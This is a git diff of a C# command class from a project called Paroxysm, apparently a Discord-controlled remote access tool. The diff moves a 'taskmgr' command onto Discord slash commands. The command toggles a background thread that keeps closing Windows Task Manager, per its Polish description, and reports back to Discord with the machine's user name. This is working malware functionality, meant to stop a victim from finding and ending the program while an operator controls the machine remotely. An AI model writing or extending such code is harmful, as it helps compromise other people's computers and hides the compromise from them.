@@ -1,24 +1,25 @@
 ﻿using System.ComponentModel;
-using Paroxysm.API.Commands.Extern;
-using Paroxysm.Debug;
+using Discord;
+using Discord.WebSocket;
+using Paroxysm.Discord.Commands.Models;
 using Paroxysm.Hooks.Actions;
 using Paroxysm.Tools;
 
 namespace Paroxysm.API.Commands;
 
-public class TaskManagerCmd : ICommand
+public class TaskManagerCmd : ISlashCommand
 {
-    public CommandOptions Options()
+    public SlashCommandOptions Options()
     {
-        return new CommandOptions
+        return new SlashCommandOptions
         {
             Name = "taskmgr",
             Description = "Uruchamia/Wyłącza zamykanie menadżera zadań"
         };
     }
 
-    [Obsolete("Obsolete")]
-    public void Execute(string[]? parameters)
+
+    public Embed Execute(SocketSlashCommandData? parameters)
     {
         Settings.TaskmgrClosed = !Settings.TaskmgrClosed;
         BackgroundWorker backgroundWorker = new();
@@ -27,12 +28,15 @@ public class TaskManagerCmd : ICommand
         if (!Settings.TaskmgrClosed)
         {
             backgroundWorker.CancelAsync();
-            Logger.CreateEmbed(ELoggerState.Error, "TaskMgr thread has been closed.");
-            return;
+
+            return EmbedCreator.CreateWithText(Color.Green, "Command was successfully executed",
+                "Task manager thread has been closed.", Environment.UserName, null);
         }
-        
+
         backgroundWorker.DoWork += TaskManagerAction.Follow;
         backgroundWorker.RunWorkerAsync();
-        Logger.CreateEmbed(ELoggerState.Info, "TaskMgr thread has been initialized.");
+
+        return EmbedCreator.CreateWithText(Color.Green, "Command was successfully executed",
+            "Task manager thread has been initialized.", Environment.UserName, null);
     }
 }
